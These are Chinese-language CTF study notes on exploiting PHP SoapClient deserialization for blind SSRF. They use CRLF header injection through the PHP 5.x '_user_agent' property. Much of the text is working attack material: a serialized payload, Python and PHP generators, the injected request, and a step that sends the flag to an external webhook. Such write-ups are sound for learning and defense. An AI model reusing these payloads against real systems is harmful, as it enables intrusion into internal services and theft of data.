## 二、知识点

### 1. 属性名有 PHP 版本差异（**09-28 踩的坑的真相**）

| PHP 版本 | SoapClient 的 UA 属性名 |
|---|---|
| **PHP 5.x** | **`_user_agent`**（带下划线）|
| PHP 7.x | `user_agent` |

- 网上文章几乎都是 PHP 7 写法 → 在本题（**PHP 5.5.38**）照抄**完全无效**
- **本地确认属性名的方法**：`serialize(new SoapClient(...))` 看输出里到底叫什么

### 2. HTTP 头"首值优先" → 注入点要抢在目标头前面

**这是本题真正卡住的根因**：能不能覆盖一个头，不取决于你注入了什么，而取决于**你的注入点排在第几**。

```
User-Agent      ← _user_agent 注入点在这
Content-Type    ← 目标头
SOAPAction      ← uri 注入点在这（晚了，覆盖不了）
```

- `uri` → 变成 `SOAPAction`，排在 `Content-Type` **之后** → body 塞得进去，但 **`Content-Type` 仍是 `text/xml`** → PHP 不按表单解析 → `$_POST` 为空
- `_user_agent` → 变成 `User-Agent`，排在 `Content-Type` **之前** → **我们的 Content-Type 排第一，赢**

### 3. CRLF 注入能一口气改三样东西

`\r\n` 可以：**提前结束当前头** → **插入新头** → **空行结束头部** → **塞 body**。

### 4. `REMOTE_ADDR` 是 TCP 层，只有 SSRF 能过

- `X-Forwarded-For` / `X-Real-IP` / `X-Client-IP` 实测**全部无效**
- 必须让**服务器自己**发请求，源地址天然是 `127.0.0.1`

### 5. `looks like we got no XML document` **= 请求成功了**

- 报错不是失败，是"对方有响应但不是 XML"
- 反序列化场景要用**报错**当探针

### 6. curl 的 `{}` globbing 会静默毁掉 payload

- URL 里带 `{}` 时 curl 会展开成多个 URL，`"` `{}` 全消失
- 解决：整体 URL 编码，或 `curl -g`

### 7. 4 级验证阶梯（盲 SSRF 通用方法论）

| 级别 | 做什么 | 验证点 |
|---|---|---|
| 1 | `location=127.0.0.1/un92.php`，不注入 | `no XML document` = SSRF 通 |
| 2 | 注入 `X-Test: HELLO`，`location=webhook` | webhook 里多出该头 = 注入生效 |
| 3 | 注入完整 Content-Type + Length + body | webhook 里 `content=` 是表单 = body 可控 |
| 4 | 同上，`location` 换回 127.0.0.1 | webhook 收到 `?flag=` = 🚩 |

## 三、案例 / payload

### 1. 最终 payload（PHP 5.x 格式）

```
O:10:"SoapClient":3:{s:11:"_user_agent";s:149:"a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 75\r\n\r\npy=flag&url=http://webhook.site/你的token";s:8:"location";s:25:"http://127.0.0.1/un92.php";s:3:"uri";s:1:"x";}
```

**说明**：`\r\n` 是真实换行符，实际是一行。`_user_agent` 的值长度要自己算，其余固定数字不用动。

### 2. Python 版（只改 `h` 一处）

```python
import requests
h = "http://webhook.site/你的token"
b = "py=flag&url=" + h
u = "a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + str(len(b)) + "\r\n\r\n" + b
p = 'O:10:"SoapClient":3:{s:11:"_user_agent";s:' + str(len(u)) + ':"' + u + '";s:8:"location";s:25:"http://127.0.0.1/un92.php";s:3:"uri";s:1:"x";}'
requests.get("http://120.76.159.54:8888/un9.php", params={"tryhackme": p})
```

**说明**：`params=` 自动 URL 编码，**避开了 curl 的 `{}` globbing 坑**。

### 3. PHP 5.4 自动生成（长度不用手算）

```php
<?php
$body = "py=flag&url=" . "http://webhook.site/你的token";
$ua = "a\r\nContent-Type: application/x-www-form-urlencoded\r\n"
    . "Content-Length: " . strlen($body) . "\r\n\r\n" . $body;

$c = new SoapClient(null, array(
    'location'   => 'http://127.0.0.1/un92.php',
    'uri'        => 'x',
    'user_agent' => $ua   // ⚠️ 构造函数写 user_agent，序列化后自动变 _user_agent
));
echo urlencode(serialize($c));
```

**说明**：**必须用 PHP 5.4 生成**（PHP 8.x 生成的是 36 个 private 属性，格式不兼容）。

### 4. 注入后实际发出的请求

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
User-Agent: a                                              ← 注入从这里开始
Content-Type: application/x-www-form-urlencoded            ← ⭐ 我们的（排第一）
Content-Length: 75
                                                           ← 空行，头结束
py=flag&url=http://webhook.site/xxxx                       ← body
Content-Type: text/xml; charset=utf-8                      ← SoapClient 原本的，掉进 body 区被忽略
SOAPAction: "x#pyflag"
```

### 5. 报错对照表

| 报错 | 含义 |
|---|---|
| `looks like we got no XML document` | **请求成功了**（正常，继续）|
| `... on a non-object` | 反序列化失败 → 查长度/引号/大括号 |
| `Error finding "uri" property` | 缺 `uri` |
| `Error could not find "location" property` | 缺 `location` |
| `[HTTP] Not Found` / `Could not connect` | 路径错 / 端口不通 |
| `Unknown protocol. Only http and https` | 协议被禁 |
| `[HTTP] Bad request` | `location` 里塞了 CRLF |

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| **`user_agent` 设了没用** | **PHP 5.x 属性名是 `_user_agent`**（抄了 PHP 7 写法）| 改用 **`_user_agent`** |
| **`uri` 注入 body 成功，但 un92 收不到参数** | `uri`→`SOAPAction` 排在 `Content-Type` **之后**，**首值优先覆盖不了** | 换 **`_user_agent`**（排在前面）|
| **用 PHP 8.2 生成 payload** | PHP 8 属性是 private → 36 个 `\0SoapClient\0xxx` | 用 **PHP 5.4** 生成或手写 |
| curl 直接发 URL，响应里 `"` `{}` 全消失 | **curl 的 `{}` URL globbing** | 整体 URL 编码，或 `curl -g` |
| 参数写在 query 里 un92 不响应 | un92 只认 **`$_POST`** | 必须注入 body |
| `location` 里塞 CRLF → `400` | 破坏请求行 | CRLF 只能从 `_user_agent` / `uri` 注入 |
| PowerShell 改 .py 文件中文乱码 → SyntaxError | 编码问题 | 用 VS Code / 记事本改 |

**⭐ 更正 09-28 的错误结论**：当时记的"`user_agent` 在 PHP 5.5 无效、只能用 `uri`" —— **两个都不对**。真相是**属性名版本差异**（`_user_agent`）+ **头部顺序决定谁能覆盖谁**，最终解法正是 `_user_agent`。
